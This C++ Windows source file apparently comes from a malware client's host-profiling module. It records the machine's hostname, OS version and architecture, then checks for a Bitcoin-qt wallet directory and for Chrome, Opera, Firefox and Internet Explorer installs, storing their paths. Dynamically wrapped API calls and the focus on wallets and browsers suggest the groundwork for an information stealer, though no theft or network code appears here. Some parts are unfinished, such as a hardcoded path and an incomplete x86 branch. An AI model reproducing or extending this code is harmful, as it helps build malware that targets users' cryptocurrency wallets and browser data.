#include <Windows.h>
#include <Shlobj.h>

#include "info.h"

#include "api.h"
#include "common/mem.h"
#include "common/str.h"

using namespace client_info;

info::info(void)
{
	this->raw_data = new raw_info();
	this->version_info = (OSVERSIONINFOA *)mem::malloc(sizeof(OSVERSIONINFOA));
	this->version_info->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	this->system_info = (SYSTEM_INFO *)mem::malloc(sizeof(SYSTEM_INFO));
}

info::~info(void)
{
	delete this->raw_data;
	mem::free_and_null((LPVOID *)&this->version_info);
	mem::free_and_null((LPVOID *)&this->system_info);
}

bool info::gather_data(void)
{
	// Hostname
	CHAR hostname[MAX_COMPUTERNAME_LENGTH + str::ASCII_CHAR] = {0};
	UINT hostname_size = sizeof(hostname);
	BOOL get_status = GetComputerNameA(hostname, (LPDWORD)&hostname_size);
	if (get_status == FALSE) {
		return false;
	}
	this->Hostname = new str_string(hostname);
	mem::copy(&this->raw_data->hostname, hostname, str::lenA(hostname));
	this->raw_data->hostname_len = str::lenA(hostname);

	// NT Version
	/*
	BOOL WINAPI GetVersionEx(
		_Inout_  LPOSVERSIONINFO lpVersionInfo
	);
	*/
	get_status = GetVersionExA(this->version_info);
	if (get_status == FALSE) {
		return false;
	}
	mem::copy(&this->raw_data->os_info, this->version_info, sizeof(OSVERSIONINFOA));

	// Get SYSTEM_INFO
	GetNativeSystemInfo(this->system_info);
	mem::copy(&this->raw_data->sys_info, this->system_info, sizeof(SYSTEM_INFO));

	// Find files
	bool parse_status = this->parse_directories(this->raw_data);
	if (parse_status == false) return parse_status;

	return true;
}

bool info::parse_directories(__inout raw_info *data)
{
	CHAR tmp_path[MAX_PATH + str::ASCII_CHAR] = {0};
	HRESULT path_status = cSHGetFolderPathA(0, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, tmp_path);
	if (path_status != S_OK) return false;
	this->AppData = new str_string(tmp_path);

	if (data->sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		mem::zeromem(tmp_path, sizeof(tmp_path));
		this->ProgFiles64 = NULL;
		path_status = cSHGetFolderPathA(0, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, tmp_path);
		if (path_status != S_OK) return false;
		this->ProgFiles86 = new str_string(tmp_path);	

		ASSERT(1, "client_info::parse_directories incomplete!");
	} else if (data->sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		mem::zeromem(tmp_path, sizeof(tmp_path));
		path_status = cSHGetFolderPathA(0, CSIDL_PROGRAM_FILESX86, NULL, SHGFP_TYPE_CURRENT, tmp_path);
		if (path_status != S_OK) return false;
		this->ProgFiles86 = new str_string(tmp_path);

		mem::zeromem(tmp_path, sizeof(tmp_path));
		path_status = cSHGetFolderPathA(0, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, tmp_path);
		if (path_status != S_OK) return false;
		this->ProgFiles64 = new str_string("C:\\Program Files");

		// Bitcoin-qt
		str_string	*bitcoin_binary_path = *this->ProgFiles86 + pf_test_bitcoin,
					*bitcoin_data_path = *this->AppData + ad_test_bitcoin2;
		if (	check_file_existence(*bitcoin_binary_path) &&
				check_file_existence(*bitcoin_data_path)) 
		{
			data->is_bitcoin = true;
			mem::copy(data->bitcoin_loc, **bitcoin_binary_path, bitcoin_binary_path->lenA());
		}

		// Chrome
		str_string *chrome_binary_path = *this->AppData + ad_test_chrome;
		if (check_file_existence(*chrome_binary_path)) {
			data->is_chrome = true;
			mem::copy(data->chrome_loc, **chrome_binary_path, chrome_binary_path->lenA());
		}

		// Opera
		str_string *opera_binary_path = *this->ProgFiles64 + pf64_test_opera;
		if (check_file_existence(*opera_binary_path)) {
			data->is_opera = true;
			mem::copy(data->opera_loc, **opera_binary_path, opera_binary_path->lenA());
		}

		// Firefox
		str_string *ff_binary_path = *this->ProgFiles86 + pf_test_ff;
		if (check_file_existence(*ff_binary_path)) {
			data->is_firefox = true;
			mem::copy(data->firefox_loc, **ff_binary_path, ff_binary_path->lenA());
		}

		// IE
		str_string *ie_binary_path = *this->ProgFiles64 + pf64_test_ie;
		if (check_file_existence(*ie_binary_path)) {
			data->is_ie = true;
			mem::copy(data->ie_loc, **ie_binary_path, ie_binary_path->lenA());
		}			

	} else {
		return false;
	} 

	return true;
}

bool client_info::check_file_existence(__in const LPSTR path)
{
	HANDLE file_handle = cCreateFileA(
		path,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (file_handle != INVALID_HANDLE_VALUE) {
		cCloseHandle(file_handle);
		return true;
	}

	return false;
}

bool client_info::check_file_existence(__in const str_string& path)
{
	return check_file_existence(*path);
}